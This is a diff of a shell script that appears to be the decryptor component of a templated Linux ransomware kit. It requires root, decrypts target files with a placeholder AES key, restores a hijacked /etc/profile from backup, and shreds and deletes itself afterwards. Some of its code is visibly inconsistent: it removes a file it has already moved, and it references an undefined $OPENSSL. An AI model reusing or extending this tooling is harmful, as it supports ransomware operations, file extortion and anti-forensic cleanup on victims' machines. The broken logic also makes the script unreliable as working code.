@@ -1,4 +1,5 @@
 #!/bin/sh
+SSL_COM="openssl"
 ################ CHECKS ###############################
 # Get the OS version
 get_os() {
@@ -19,7 +20,7 @@ check_req() {
 	echo  "[!] NOT ROOT"
         exit
     fi
-    if [ "$(which openssl)" = "" ]; then
+    if [ "$(which $SSL_COM)" = "" ]; then
         echo  "[!] NO OPENSSL FOUND"
         exit
     fi
@@ -38,12 +39,17 @@ openfile() {
 
 ################## DECRYPT ################################
 decrypt() {
-    echo "[+] Decrypted $1"
-    openfile $1
-    openfile $1.dec
-    mv $1 $1.enc
-    openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
-    rm $1.enc
+    #$SSL_COM $1
+    #$SSL_COM $1.dec
+    #mv $1 $1.enc
+    $SSL_COM aes-256-cbc -d -k "$KEY" -in "$1" -out "$1.dec"
+    if [ $? = 0 ]; then
+	mv $1.dec $1
+	rm $1.dec
+	echo "[+] Decrypted $1"
+    else
+	echo "[+] Error Decrypting $1"
+    fi
 }
 
 loop() {
@@ -66,8 +72,9 @@ check_req
 KEY="__KEY__"
 PUBLICKEY="\
 __STRING__"
-echo -n "$PUBLICKEY" | openssl base64 -d | $OPENSSL
+echo -n "$PUBLICKEY" | $SSL_COM base64 -d | $OPENSSL
 loop "__TARGETS__"
 rm /etc/profile
 mv /etc/profile.bak /etc/profile
 shred $0
+rm $0
